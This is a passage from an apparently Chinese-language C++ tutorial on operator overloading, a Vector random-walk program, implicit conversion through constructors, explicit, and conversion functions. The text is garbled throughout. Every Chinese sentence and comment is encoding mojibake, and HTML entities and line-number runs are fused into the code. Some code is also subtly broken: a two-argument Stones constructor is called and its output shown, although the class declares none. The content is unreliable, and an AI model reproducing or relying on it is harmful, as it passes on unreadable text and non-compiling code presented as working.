æ¥å—è§’åº¦å€¼ï¼ˆå¦‚æœæ˜¯æåæ ‡æ¨¡å¼ï¼‰ï¼Œå¹¶å°†å…¶è½¬æ¢ä¸ºå¼§åº¦å­˜å‚¨ã€‚angval() å’Œ operator&lt;&lt; åœ¨æ˜¾ç¤ºæ—¶å°†å†…éƒ¨çš„å¼§åº¦è½¬æ¢å›è§’åº¦ã€‚ å‹å…ƒå‡½æ•°: operator* (double * Vector) å’Œ operator&lt;&lt; è¢«å®ç°ä¸ºå‹å…ƒå‡½æ•°ï¼ŒåŸå› ä¸ Time ç±»ä¸­çš„ç±»ä¼¼ï¼šoperator* éœ€è¦å¤„ç† double ä½œä¸ºå·¦æ“ä½œæ•°çš„æƒ…å†µï¼Œoperator&lt;&lt; éœ€è¦ ostream ä½œä¸ºå·¦æ“ä½œæ•°ï¼Œå¹¶ä¸”å®ƒä»¬éƒ½éœ€è¦è®¿é—® Vector çš„ç§æœ‰æˆå‘˜ã€‚ 11.5.4 ä½¿ç”¨ Vector ç±»æ¥æ¨¡æ‹Ÿéšæœºæ¼«æ­¥ç°åœ¨æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ Vector ç±»æ¥æ¨¡æ‹Ÿä¸€ä¸ªç®€å•çš„ç‰©ç†è¿‡ç¨‹ï¼šéšæœºæ¼«æ­¥ã€‚å‡è®¾ä¸€ä¸ªäººä»åŸç‚¹å‡ºå‘ï¼Œæ¯æ¬¡éšæœºé€‰æ‹©ä¸€ä¸ªæ–¹å‘è¡Œèµ°å›ºå®šçš„ä¸€æ®µè·ç¦»ï¼Œé‡å¤å¤šæ¬¡ï¼Œæˆ‘ä»¬æƒ³çŸ¥é“ä»–æœ€ç»ˆçš„ä½ç½®ã€‚ randwalk.cpp (ä¸»ç¨‹åº) 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859// filepath: d:\\ProgramData\\files_Cpp\\250424\\randwalk.cpp#include &lt;iostream&gt;#include &lt;cstdlib&gt; // æä¾› rand(), srand() åŸå‹#include &lt;ctime&gt; // æä¾› time() åŸå‹#include &quot;vector.h&quot; // åŒ…å« Vector ç±»å®šä¹‰ (å‡è®¾åœ¨åŒä¸€ç›®å½•æˆ–åŒ…å«è·¯å¾„ä¸­)int main() &#123; using namespace std; using VECTOR::Vector; // ä½¿ç”¨ VECTOR å‘½åç©ºé—´ä¸­çš„ Vector srand(time(0)); // åˆå§‹åŒ–éšæœºæ•°ç”Ÿæˆå™¨ double direction; Vector step; // å½“å‰ä¸€æ­¥çš„çŸ¢é‡ Vector result(0.0, 0.0); // ä»åŸç‚¹å¼€å§‹çš„æ€»ä½ç§» unsigned long steps = 0; // æ€»æ­¥æ•° double target; // ç›®æ ‡è·ç¦» double dstep; // æ¯æ­¥çš„è·ç¦» cout &lt;&lt; &quot;Enter target distance (q to quit): &quot;; while (cin &gt;&gt; target) &#123; // å¾ªç¯ç›´åˆ°è¾“å…¥éæ•°å­— cout &lt;&lt; &quot;Enter step length: &quot;; if (!(cin &gt;&gt; dstep)) break; // å¦‚æœæ­¥é•¿è¾“å…¥æ— æ•ˆåˆ™é€€å‡º cout &lt;&lt; &quot;Target Distance: &quot; &lt;&lt; target &lt;&lt; &quot;, Step Size: &quot; &lt;&lt; dstep &lt;&lt; endl; cout &lt;&lt; steps &lt;&lt; &quot;: &quot; &lt;&lt; result &lt;&lt; endl; // è¾“å‡ºåˆå§‹ä½ç½® // å¼€å§‹éšæœºæ¼«æ­¥ while (result.magval() &lt; target) &#123; // åªè¦è¿˜æ²¡è¾¾åˆ°ç›®æ ‡è·ç¦» direction = rand() % 360; // éšæœºç”Ÿæˆ 0-359 åº¦çš„æ–¹å‘ step.reset(dstep, direction, Vector::POL); // è®¾ç½®å½“å‰æ­¥çš„çŸ¢é‡ (æåæ ‡) result = result + step; // å°†å½“å‰æ­¥åŠ åˆ°æ€»ä½ç§»ä¸Š steps++; cout &lt;&lt; steps &lt;&lt; &quot;: &quot; &lt;&lt; result &lt;&lt; endl; // è¾“å‡ºå½“å‰ä½ç½® &#125; // è¾“å‡ºæœ€ç»ˆç»“æœ cout &lt;&lt; &quot;After &quot; &lt;&lt; steps &lt;&lt; &quot; steps, the subject &quot; &quot;has the following location:\\n&quot;; cout &lt;&lt; result &lt;&lt; endl; // è¾“å‡ºæœ€ç»ˆä½ç½® (é»˜è®¤ç›´è§’åæ ‡) result.polar_mode(); // åˆ‡æ¢åˆ°æåæ ‡æ¨¡å¼ cout &lt;&lt; &quot; or\\n&quot; &lt;&lt; result &lt;&lt; endl; // è¾“å‡ºæœ€ç»ˆä½ç½® (æåæ ‡) cout &lt;&lt; &quot;Average outward distance per step = &quot; &lt;&lt; result.magval() / steps &lt;&lt; endl; // è®¡ç®—å¹³å‡æ¯æ­¥ç§»åŠ¨çš„ç›´çº¿è·ç¦» // é‡ç½®ä»¥ä¾¿ä¸‹ä¸€æ¬¡æ¨¡æ‹Ÿ steps = 0; result.reset(0.0, 0.0); cout &lt;&lt; &quot;\\nEnter target distance (q to quit): &quot;; &#125; cout &lt;&lt; &quot;Bye!\\n&quot;; cin.clear(); // æ¸…é™¤å¯èƒ½çš„é”™è¯¯çŠ¶æ€ while (cin.get() != &#x27;\\n&#x27;) // æ¸…ç©ºè¾“å…¥ç¼“å†²åŒº continue; return 0;&#125; ç¼–è¯‘å’Œè¿è¡Œ: ä½ éœ€è¦å°† vector.cpp å’Œ randwalk.cpp ä¸€èµ·ç¼–è¯‘é“¾æ¥ã€‚ 12g++ randwalk.cpp vector.cpp -o randwalk -lm # å¯èƒ½éœ€è¦é“¾æ¥æ•°å­¦åº“ (-lm)./randwalk ç¨‹åºä¼šæç¤ºä½ è¾“å…¥ç›®æ ‡è·ç¦»å’Œæ¯æ­¥çš„é•¿åº¦ï¼Œç„¶åæ¨¡æ‹Ÿéšæœºæ¼«æ­¥è¿‡ç¨‹ï¼Œæ‰“å°æ¯ä¸€æ­¥åçš„ä½ç½®ï¼Œç›´åˆ°è¾¾åˆ°ç›®æ ‡è·ç¦»ï¼Œæœ€åè¾“å‡ºæ€»ç»“ä¿¡æ¯ã€‚è¿™ä¸ªä¾‹å­å¾ˆå¥½åœ°å±•ç¤ºäº†å¦‚ä½•åˆ©ç”¨è¿ç®—ç¬¦é‡è½½ä½¿ç±»çš„ä½¿ç”¨ï¼ˆå¦‚ result = result + step;ï¼‰å˜å¾—ç›´è§‚å’Œæ–¹ä¾¿ã€‚ 11.6 ç±»çš„è‡ªåŠ¨è½¬æ¢å’Œå¼ºåˆ¶ç±»å‹è½¬æ¢C++ æ˜¯ä¸€ç§å¼ºç±»å‹è¯­è¨€ï¼Œä½†å®ƒä¹Ÿå…è®¸åœ¨ä¸åŒç±»å‹ä¹‹é—´è¿›è¡Œè½¬æ¢ã€‚æˆ‘ä»¬å·²ç»ç†Ÿæ‚‰äº†å†…ç½®ç±»å‹ä¹‹é—´çš„è½¬æ¢ï¼ˆä¾‹å¦‚ int åˆ° doubleï¼‰ã€‚C++ ä¹Ÿå…è®¸å®šä¹‰ç±»ç±»å‹ä¸å…¶å®ƒç±»å‹ï¼ˆåŒ…æ‹¬å†…ç½®ç±»å‹å’Œå…¶ä»–ç±»ç±»å‹ï¼‰ä¹‹é—´çš„è½¬æ¢è§„åˆ™ã€‚è¿™ç§è½¬æ¢å¯ä»¥æ˜¯è‡ªåŠ¨ï¼ˆéšå¼ï¼‰å‘ç”Ÿçš„ï¼Œä¹Ÿå¯ä»¥æ˜¯éœ€è¦æ˜¾å¼è¯·æ±‚çš„ï¼ˆå¼ºåˆ¶ç±»å‹è½¬æ¢ï¼‰ã€‚ 11.6.1 éšå¼è½¬æ¢ï¼šä½¿ç”¨æ„é€ å‡½æ•°å¦‚æœä¸€ä¸ªç±»çš„æ„é€ å‡½æ•°å¯ä»¥ç”¨å•ä¸ªå‚æ•°æ¥è°ƒç”¨ï¼ˆè¦ä¹ˆå®ƒåªæœ‰ä¸€ä¸ªå‚æ•°ï¼Œè¦ä¹ˆå®ƒæœ‰å¤šä¸ªå‚æ•°ä½†ç¬¬ä¸€ä¸ªå‚æ•°ä¹‹åçš„æ‰€æœ‰å‚æ•°éƒ½æœ‰é»˜è®¤å€¼ï¼‰ï¼Œé‚£ä¹ˆè¿™ä¸ªæ„é€ å‡½æ•°å°±å®šä¹‰äº†ä¸€ä¸ªä»å…¶å‚æ•°ç±»å‹åˆ°è¯¥ç±»ç±»å‹çš„éšå¼è½¬æ¢è§„åˆ™ã€‚ ç¤ºä¾‹ï¼š å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªç®€å•çš„ Stones ç±»ï¼Œè¡¨ç¤ºè‹±çŸ³ï¼ˆä¸€ç§é‡é‡å•ä½ï¼‰ï¼Œå¹¶ä¸”æˆ‘ä»¬æƒ³å…è®¸ä» doubleï¼ˆè¡¨ç¤ºç£…ï¼‰è‡ªåŠ¨è½¬æ¢ä¸º Stonesã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283// stones.h#ifndef STONES_H_#define STONES_H_class Stones &#123;private: enum &#123; Lbs_per_stn = 14 &#125;; // æ¯è‹±çŸ³åŒ…å«çš„ç£…æ•° int stone; // æ•´æ•°éƒ¨åˆ†çš„è‹±çŸ³ double pds_left; // å‰©ä½™çš„å°æ•°ç£…æ•° double pounds; // æ€»ç£…æ•°public: // æ„é€ å‡½æ•°ï¼šæ¥å—æ€»ç£…æ•° (double) Stones(double lbs); // é»˜è®¤æ„é€ å‡½æ•° Stones(); ~Stones(); void show_lbs() const; // ä»¥ç£…æ˜¾ç¤º void show_stn() const; // ä»¥è‹±çŸ³æ ¼å¼æ˜¾ç¤º&#125;;#endif // STONES_H_// stones.cpp#include &lt;iostream&gt;#include &quot;stones.h&quot;Stones::Stones(double lbs) &#123; pounds = lbs; stone = int(lbs) / Lbs_per_stn; // æ•´æ•°è‹±çŸ³ pds_left = int(lbs) % Lbs_per_stn + lbs - int(lbs); // å‰©ä½™ç£…æ•°&#125;Stones::Stones() &#123; stone = pounds = pds_left = 0;&#125;Stones::~Stones() &#123;&#125;void Stones::show_lbs() const &#123; std::cout &lt;&lt; pounds &lt;&lt; &quot; pounds\\n&quot;;&#125;void Stones::show_stn() const &#123; std::cout &lt;&lt; stone &lt;&lt; &quot; stone, &quot; &lt;&lt; pds_left &lt;&lt; &quot; pounds\\n&quot;;&#125;// main.cpp#include &lt;iostream&gt;#include &quot;stones.h&quot;void display(const Stones &amp; st, int n); // å‡½æ•°æ¥å— Stones å¯¹è±¡int main() &#123; Stones incognito = 275; // éšå¼è½¬æ¢: è°ƒç”¨ Stones(275.0) Stones wolfe(285.7); // æ˜¾å¼è°ƒç”¨æ„é€ å‡½æ•° Stones taft = 325; // éšå¼è½¬æ¢: è°ƒç”¨ Stones(325.0) std::cout &lt;&lt; &quot;Incognito weighs &quot;; incognito.show_stn(); std::cout &lt;&lt; &quot;Wolfe weighs &quot;; wolfe.show_stn(); std::cout &lt;&lt; &quot;Taft weighs &quot;; taft.show_stn(); incognito = 276.8; // éšå¼è½¬æ¢: è°ƒç”¨ Stones(276.8), ç„¶åèµ‹å€¼ taft = Stones(330); // æ˜¾å¼è½¬æ¢ (è°ƒç”¨æ„é€ å‡½æ•°) std::cout &lt;&lt; &quot;After dinner, Incognito weighs &quot;; incognito.show_stn(); std::cout &lt;&lt; &quot;After dinner, Taft weighs &quot;; taft.show_stn(); display(19.99, 2); // éšå¼è½¬æ¢: 19.99 è½¬æ¢ä¸ºä¸´æ—¶ Stones å¯¹è±¡ä¼ é€’ç»™å‡½æ•° return 0;&#125;void display(const Stones &amp; st, int n) &#123; for (int i = 0; i &lt; n; i++) &#123; std::cout &lt;&lt; &quot;Wow! &quot;; st.show_stn(); &#125;&#125; åœ¨ main å‡½æ•°ä¸­ï¼š Stones incognito = 275; å’Œ Stones taft = 325;ï¼šæ•´æ•° 275 å’Œ 325 é¦–å…ˆè¢«æå‡ä¸º doubleï¼Œç„¶åç¼–è¯‘å™¨ä½¿ç”¨ Stones(double) æ„é€ å‡½æ•°åˆ›å»ºäº†ä¸€ä¸ªä¸´æ—¶çš„ Stones å¯¹è±¡ï¼Œå¹¶ç”¨è¿™ä¸ªä¸´æ—¶å¯¹è±¡æ¥åˆå§‹åŒ– incognito å’Œ taftï¼ˆåœ¨ç°ä»£ C++ ä¸­ï¼Œè¿™é€šå¸¸ä¼šè¢«ä¼˜åŒ–ï¼Œç›´æ¥åœ¨ç›®æ ‡å¯¹è±¡ä¸Šæ„é€ ï¼Œç§°ä¸ºå¤åˆ¶çœç•¥ï¼‰ã€‚ incognito = 276.8;ï¼šdouble å€¼ 276.8 è¢«ç”¨æ¥åˆ›å»ºä¸€ä¸ªä¸´æ—¶çš„ Stones å¯¹è±¡ï¼Œç„¶åè¯¥ä¸´æ—¶å¯¹è±¡é€šè¿‡èµ‹å€¼è¿ç®—ç¬¦ï¼ˆè¿™é‡Œæ˜¯é»˜è®¤çš„èµ‹å€¼è¿ç®—ç¬¦ï¼‰èµ‹ç»™ incognitoã€‚ display(19.99, 2);ï¼šdouble å€¼ 19.99 è¢«ç”¨æ¥åˆ›å»ºä¸€ä¸ªä¸´æ—¶çš„ Stones å¯¹è±¡ï¼Œè¿™ä¸ªä¸´æ—¶å¯¹è±¡ä½œä¸ºå‚æ•°ä¼ é€’ç»™ display å‡½æ•°ã€‚ è¿™ç§éšå¼è½¬æ¢æœ‰æ—¶å¾ˆæ–¹ä¾¿ï¼Œä½†ä¹Ÿå¯èƒ½å¯¼è‡´æ„æƒ³ä¸åˆ°çš„è¡Œä¸ºæˆ–é”™è¯¯ï¼Œç‰¹åˆ«æ˜¯å½“è½¬æ¢ä¸æ˜¯ç¨‹åºå‘˜çš„æœ¬æ„æ—¶ã€‚ ä½¿ç”¨ explicit å…³é”®å­— ä¸ºäº†ç¦æ­¢æ„é€ å‡½æ•°ç”¨äºéšå¼è½¬æ¢ï¼Œå¯ä»¥åœ¨æ„é€ å‡½æ•°å£°æ˜å‰åŠ ä¸Š explicit å…³é”®å­—ã€‚ 123456789101112// stones.h (ä¿®æ”¹å)// ...class Stones &#123; // ...public: // ä½¿ç”¨ explicit ç¦æ­¢éšå¼è½¬æ¢ explicit Stones(double lbs); Stones(); ~Stones(); // ...&#125;;// ... å¦‚æœä½¿ç”¨äº† explicitï¼Œé‚£ä¹ˆä¹‹å‰çš„éšå¼è½¬æ¢ä»£ç å°†ä¸å†åˆæ³•ï¼š 123456789101112131415161718192021// main.cpp (ä½¿ç”¨ explicit Stones å)int main() &#123; // Stones incognito = 275; // é”™è¯¯ï¼ä¸èƒ½éšå¼è½¬æ¢ // Stones taft = 325; // é”™è¯¯ï¼ä¸èƒ½éšå¼è½¬æ¢ Stones wolfe(285.7); // OK: æ˜¾å¼è°ƒç”¨æ„é€ å‡½æ•° Stones incognito = Stones(275); // OK: æ˜¾å¼è½¬æ¢ (è°ƒç”¨æ„é€ å‡½æ•°) Stones taft(325); // OK: æ˜¾å¼è°ƒç”¨æ„é€ å‡½æ•° // incognito = 276.8; // é”™è¯¯ï¼ä¸èƒ½éšå¼è½¬æ¢åèµ‹å€¼ incognito = Stones(276.8); // OK: æ˜¾å¼è½¬æ¢åèµ‹å€¼ // display(19.99, 2); // é”™è¯¯ï¼ä¸èƒ½éšå¼è½¬æ¢å‚æ•° display(Stones(19.99), 2); // OK: æ˜¾å¼è½¬æ¢å‚æ•° // å¼ºåˆ¶ç±»å‹è½¬æ¢ä¹Ÿå…è®¸ display((Stones)20.5, 1); // C é£æ ¼å¼ºåˆ¶è½¬æ¢ display(static_cast&lt;Stones&gt;(21.2), 1); // C++ é£æ ¼å¼ºåˆ¶è½¬æ¢ return 0;&#125; å»ºè®®: é€šå¸¸å»ºè®®å°†åªæ¥å—ä¸€ä¸ªå‚æ•°çš„æ„é€ å‡½æ•°å£°æ˜ä¸º explicitï¼Œé™¤éä½ ç¡®å®å¸Œæœ›è¿›è¡Œè¯¥ç±»å‹çš„éšå¼è½¬æ¢ã€‚è¿™å¯ä»¥é˜²æ­¢è®¸å¤šæ½œåœ¨çš„é”™è¯¯ã€‚ 11.6.2 è½¬æ¢å‡½æ•°ï¼šoperator typeName()æ„é€ å‡½æ•°æä¾›äº†ä»å…¶ä»–ç±»å‹åˆ°ç±»ç±»å‹çš„è½¬æ¢ã€‚å¦‚æœæˆ‘ä»¬æƒ³å®šä¹‰ä»ç±»ç±»å‹è½¬æ¢åˆ°å…¶ä»–ç±»å‹ï¼ˆå¦‚ double æˆ– intï¼‰çš„è§„åˆ™ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨**è½¬æ¢å‡½æ•° (Conversion Function)**ã€‚ è½¬æ¢å‡½æ•°æ˜¯ä¸€ç§ç‰¹æ®Šçš„ç±»æˆå‘˜å‡½æ•°ï¼Œå½¢å¼ä¸º operator typeName()ã€‚ ç‰¹ç‚¹: åç§°: operator å…³é”®å­—åè·Ÿç›®æ ‡ç±»å‹å typeNameã€‚ æ— è¿”å›ç±»å‹å£°æ˜: å‡½æ•°å¤´ä¸èƒ½æŒ‡å®šè¿”å›ç±»å‹ï¼ˆå³ä½¿å®ƒç¡®å®ä¼šè¿”å›ä¸€ä¸ª typeName ç±»å‹çš„å€¼ï¼‰ã€‚ æ— å‚æ•°: è½¬æ¢å‡½æ•°å¿…é¡»æ˜¯æ²¡æœ‰å‚æ•°çš„æˆå‘˜å‡½æ•°ã€‚ å¿…é¡»æ˜¯æˆå‘˜å‡½æ•°: ä¸èƒ½æ˜¯é™æ€æˆå‘˜å‡½æ•°æˆ–å‹å…ƒå‡½æ•°ã€‚ ç¤ºä¾‹ï¼šä¸º Stones æ·»åŠ è½¬æ¢ä¸º double å’Œ int çš„å‡½æ•° 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950// stones.h (æ·»åŠ è½¬æ¢å‡½æ•°)// ...class Stones &#123; // ...public: explicit Stones(double lbs); Stones(); ~Stones(); void show_lbs() const; void show_stn() const; // è½¬æ¢å‡½æ•°ï¼šè½¬æ¢ä¸º double (æ€»ç£…æ•°) operator double() const; // è½¬æ¢å‡½æ•°ï¼šè½¬æ¢ä¸º int (å››èˆäº”å…¥çš„æ€»ç£…æ•°) operator int() const;&#125;;// ...// stones.cpp (æ·»åŠ è½¬æ¢å‡½æ•°å®šä¹‰)// ...Stones::operator double() const &#123; return pounds; // è¿”å›æ€»ç£…æ•°&#125;Stones::operator int() const &#123; // å››èˆäº”å…¥åˆ°æœ€è¿‘çš„æ•´æ•°ç£… return int(pounds + 0.5);&#125;// ...// main.cpp (ä½¿ç”¨è½¬æ¢å‡½æ•°)#include &lt;iostream&gt;#include &quot;stones.h&quot;int main() &#123; Stones poppins(9, 2.8); // 9 stone, 2.8 pounds double p_wt = poppins; // éšå¼è½¬æ¢: è°ƒç”¨ poppins.operator double() int int_wt = poppins; // éšå¼è½¬æ¢: è°ƒç”¨ poppins.operator int() std::cout &lt;&lt; &quot;Poppins weighs &quot; &lt;&lt; p_wt &lt;&lt; &quot; pounds.\\n&quot;; std::cout &lt;&lt; &quot;Poppins weighs &quot; &lt;&lt; int_wt &lt;&lt; &quot; pounds (rounded).\\n&quot;; // ä¹Ÿå¯ä»¥æ˜¾å¼è°ƒç”¨ double p_wt_explicit = double(poppins); int int_wt_explicit = int(poppins); std::cout &lt;&lt; &quot;Explicit double: &quot; &lt;&lt; p_wt_explicit &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Explicit int: &quot; &lt;&lt; int_wt_explicit &lt;&lt; std::endl; return 0;&#125; è¾“å‡º: 1234Poppins weighs 128.8 pounds.Poppins weighs 129 pounds (rounded).Explicit double: 128.8Explicit int: 129 explicit è½¬æ¢å‡½æ•° (C++11) ä¸æ„é€ å‡½æ•°ç±»ä¼¼ï¼ŒC++11 å…è®¸å°†è½¬æ¢å‡½æ•°å£°æ˜ä¸º explicitï¼Œä»¥é˜²æ­¢å®ƒä»¬è¢«ç”¨äºéšå¼è½¬æ¢ã€‚å¦‚æœè½¬æ¢å‡½æ•°æ˜¯ explicit çš„ï¼Œé‚£ä¹ˆåªèƒ½åœ¨éœ€è¦æ˜¾å¼è½¬æ¢çš„ä¸Šä¸‹æ–‡ä¸­ä½¿ç”¨ï¼ˆä¾‹å¦‚ï¼Œä½¿ç”¨ static_cast æˆ–ç›´æ¥åˆå§‹åŒ–ï¼‰ã€‚ 123456789101112131415161718192021222324252627// stones.h (ä½¿ç”¨ explicit è½¬æ¢å‡½æ•°)class Stones &#123; // ...public: // ... explicit operator double() const; explicit operator int() const;&#125;;// main.cpp (ä½¿ç”¨ explicit è½¬æ¢å‡½æ•°å)int main() &#123; Stones poppins(9, 2.8); // double p_wt = poppins; // é”™è¯¯ï¼ä¸èƒ½éšå¼è½¬æ¢ // int int_wt = poppins; // é”™è¯¯ï¼ä¸èƒ½éšå¼è½¬æ¢ // éœ€è¦æ˜¾å¼è½¬æ¢ double p_wt = static_cast&lt;double&gt;(poppins); int int_wt = static_cast&lt;int&gt;(poppins); std::cout &lt;&lt; &quot;Poppins weighs &quot; &lt;&lt; p_wt &lt;&lt; &quot; pounds.\\n&quot;; std::cout &lt;&lt; &quot;Poppins weighs &quot; &lt;&lt; int_wt &lt;&lt; &quot; pounds (rounded).\\n&quot;; // if (poppins) &#123; ... &#125; // å¦‚æœ operator bool() æ˜¯ explicitï¼Œè¿™é‡Œä¹Ÿä¼šæŠ¥é”™ if (static_cast&lt;bool&gt;(poppins)) &#123; /* ... */ &#125; // éœ€è¦æ˜¾å¼è½¬æ¢ return 0;&#125; å°†è½¬æ¢å‡½æ•°è®¾ä¸º explicit é€šå¸¸ä¹Ÿæ˜¯ä¸€ä¸ªå¥½ä¸»æ„ï¼Œé™¤ééšå¼è½¬æ¢ç¡®å®æ˜¯ä½ æƒ³è¦çš„è¡Œä¸ºï¼ˆä¾‹å¦‚ operator bool() åœ¨æ¡ä»¶è¯­å¥ä¸­çš„ä½¿ç”¨ï¼Œä½†åœ¨ C++11 åä¹Ÿæ¨è explicit operator bool()ï¼‰ã€‚ 11.6.3 è½¬æ¢å‡½æ•°å’Œå‹å…ƒå‡½æ•°è½¬æ¢å‡½æ•°å’Œæ¥å—å•å‚æ•°çš„æ„é€ å‡½æ•°éƒ½å¯èƒ½å¯¼è‡´äºŒä¹‰æ€§é—®é¢˜ï¼Œå°¤å…¶æ˜¯åœ¨ä¸é‡è½½è¿ç®—ç¬¦ï¼ˆç‰¹åˆ«æ˜¯å‹å…ƒå‡½æ•°ï¼‰ä¸€èµ·ä½¿ç”¨æ—¶ã€‚ äºŒä¹‰æ€§ç¤ºä¾‹: è€ƒè™‘ä¹‹å‰çš„ Vector ç±»å’Œ Vector operator*(double n, const Vector &amp; a); å‹å…ƒå‡½æ•°ã€‚å¦‚æœæˆ‘ä»¬ä¸º Vector æ·»åŠ ä¸€ä¸ªæ¥å— double çš„æ„é€ å‡½æ•°ï¼ˆå¯èƒ½è¡¨ç¤ºåˆ›å»ºä¸€ä¸ªå¤§å°ä¸º doubleã€è§’åº¦ä¸º 0 çš„å‘é‡ï¼‰å’Œä¸€ä¸ªè½¬æ¢ä¸º double çš„å‡½æ•°ï¼ˆå¯èƒ½è¿”å›å‘é‡çš„å¤§å° magval()ï¼‰ï¼Œä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿ 1234567891011121314151617// vector.h (å‡è®¾æ·»åŠ äº†è½¬æ¢æ„é€ å‡½æ•°å’Œå‡½æ•°)namespace VECTOR &#123; class Vector &#123; // ... public: Vector(double val); // è½¬æ¢æ„é€ å‡½æ•° (å¯èƒ½ä¸ explicit) operator double() const; // è½¬æ¢å‡½æ•° (å¯èƒ½ä¸ explicit) // ... friend Vector operator*(double n, const Vector &amp; a); &#125;;&#125;// main.cppVECTOR::Vector result;VECTOR::Vector vec(10.0, 20.0);double factor = 2.0;result = factor * vec; // æ½œåœ¨çš„äºŒä¹‰æ€§ï¼ ç¼–è¯‘å™¨åœ¨å¤„ç† factor * vec æ—¶ï¼Œå¯èƒ½ä¼šæœ‰ä¸¤ç§è§£é‡Šï¼š è°ƒç”¨å‹å…ƒå‡½æ•°: operator*(factor, vec)ï¼Œè¿™æ˜¯æˆ‘ä»¬åŸæœ¬æœŸæœ›çš„ã€‚ ä½¿ç”¨è½¬æ¢å‡½æ•°: å°† vec è½¬æ¢ä¸º doubleï¼ˆé€šè¿‡ vec.operator double()ï¼‰ï¼Œç„¶åæ‰§è¡Œ double * double çš„å†…ç½®ä¹˜æ³•ã€‚ å¦‚æœ Vector(double) å’Œ operator double() éƒ½å­˜åœ¨ä¸”éƒ½ä¸æ˜¯ explicitï¼Œç¼–è¯‘å™¨é€šå¸¸ä¼šå› ä¸ºæ— æ³•ç¡®å®šä½¿ç”¨å“ªä¸ªè½¬æ¢è·¯å¾„è€ŒæŠ¥å‘Š**äºŒä¹‰æ€§é”™è¯¯ (ambiguity error)**ã€‚ è§£å†³æ–¹æ³•: ä½¿ç”¨ explicit: å°†è½¬æ¢æ„é€ å‡½æ•°å’Œè½¬æ¢å‡½æ•°å£°æ˜ä¸º explicitï¼Œå¯ä»¥æ¶ˆé™¤éšå¼è½¬æ¢å¸¦æ¥çš„äºŒä¹‰æ€§ã€‚ç”¨æˆ·å¿…é¡»æ˜¾å¼æŒ‡å®šè½¬æ¢ã€‚ æä¾›ç²¾ç¡®åŒ¹é…çš„å‡½æ•°: å¦‚æœåªæä¾›äº† operator*(double, const Vector&amp;)ï¼Œè€Œæ²¡æœ‰æä¾› operator double()ï¼Œé‚£ä¹ˆç¼–è¯‘å™¨ä¼šä¼˜å…ˆé€‰æ‹©ç²¾ç¡®åŒ¹é…çš„å‹å…ƒå‡½æ•°ï¼Œä¸ä¼šäº§ç”ŸäºŒä¹‰æ€§ã€‚ é¿å…å®šä¹‰ç›¸äº’å†²çªçš„è½¬æ¢: åœ¨è®¾è®¡ç±»æ—¶ï¼Œä»”ç»†è€ƒè™‘å¯èƒ½éœ€è¦çš„è½¬æ¢ï¼Œé¿å…åŒæ—¶æä¾›ä»ç±»å‹ A åˆ°ç±»å‹ B ä»¥åŠä»ç±»å‹ B åˆ°ç±»å‹ A çš„éšå¼è½¬æ¢ï¼Œæˆ–è€…æä¾›å¤šä¸ªå¯èƒ½å¯¼è‡´ç›¸åŒç»“æœçš„è½¬æ¢è·¯å¾„ã€‚ æ€»ç»“: æ¥å—å•ä¸ªå‚æ•°çš„æ„é€ å‡½æ•°å®šä¹‰äº†ä»å‚æ•°ç±»å‹åˆ°ç±»ç±»å‹çš„éšå¼è½¬æ¢ï¼Œé™¤éä½¿ç”¨ explicit é˜»æ­¢ã€‚ è½¬æ¢å‡½æ•° operator typeName() å®šä¹‰äº†ä»ç±»ç±»å‹åˆ° typeName ç±»å‹çš„è½¬æ¢ï¼Œå¯ä»¥æ˜¯éšå¼çš„ï¼Œé™¤éä½¿ç”¨ explicit (C++11) é˜»æ­¢ã€‚ éšå¼è½¬æ¢è™½ç„¶æ–¹ä¾¿ï¼Œä½†å¯èƒ½å¯¼è‡´æ„å¤–è¡Œä¸ºå’ŒäºŒä¹‰æ€§ã€‚ä¼˜å…ˆä½¿ç”¨ explicit æ¥æ§åˆ¶è½¬æ¢ã€‚ å½“å­˜åœ¨å¤šä¸ªè½¬æ¢è·¯å¾„ï¼ˆé€šè¿‡æ„é€ å‡½æ•°æˆ–è½¬æ¢å‡½æ•°ï¼‰å¯ä»¥ä½¿è¡¨è¾¾å¼åˆæ³•æ—¶ï¼Œç¼–è¯‘å™¨å¯èƒ½ä¼šé‡åˆ°äºŒä¹‰æ€§é—®é¢˜ã€‚ åœ¨è®¾è®¡ç±»æ—¶ï¼Œåº”è°¨æ…è€ƒè™‘è½¬æ¢éœ€æ±‚ï¼Œé¿å…å¼•å…¥ä¸å¿…è¦çš„æˆ–æœ‰æ­§ä¹‰çš„è½¬æ¢è§„åˆ™ã€‚ 11.7 æ€»ç»“æœ¬ç« é‡ç‚¹ä»‹ç»äº†å¦‚ä½•é€šè¿‡è¿ç®—ç¬¦é‡è½½ã€å‹å…ƒå’Œç±»å‹è½¬æ¢ç­‰ç‰¹æ€§æ¥æ‰©å±•ç±»çš„åŠŸèƒ½ï¼Œä½¿å…¶ä½¿ç”¨èµ·æ¥æ›´è‡ªç„¶ã€æ›´å¼ºå¤§ã€‚ ä¸»è¦å†…å®¹å›é¡¾ï¼š è¿ç®—ç¬¦é‡è½½ (Operator Overloading): å…è®¸ä¸ºç±»å®šä¹‰æ ‡å‡† C++ è¿ç®—ç¬¦ï¼ˆå¦‚ +, -, *, &lt;&lt;ï¼‰çš„è¡Œä¸ºã€‚ ç›®çš„æ˜¯æé«˜ä»£ç çš„å¯è¯»æ€§å’Œç›´è§‚æ€§ï¼Œä½¿ç±»å¯¹è±¡çš„è¿ç®—ç±»ä¼¼äºå†…ç½®ç±»å‹ã€‚ é€šè¿‡å®šä¹‰è¿ç®—ç¬¦å‡½æ•°ï¼ˆoperator+, operator&lt;&lt; ç­‰ï¼‰æ¥å®ç°ã€‚ è¿ç®—ç¬¦å‡½æ•°å¯ä»¥æ˜¯æˆå‘˜å‡½æ•°æˆ–éæˆå‘˜å‡½æ•°ï¼ˆé€šå¸¸æ˜¯å‹å…ƒï¼‰ã€‚ é‡è½½ä¸èƒ½æ”¹å˜è¿ç®—ç¬¦çš„ä¼˜å…ˆçº§ã€ç»“åˆæ€§æˆ–æ“ä½œæ•°ä¸ªæ•°ï¼Œä¹Ÿä¸èƒ½åˆ›å»ºæ–°è¿ç®—ç¬¦ã€‚æŸäº›è¿ç®—ç¬¦ï¼ˆå¦‚ 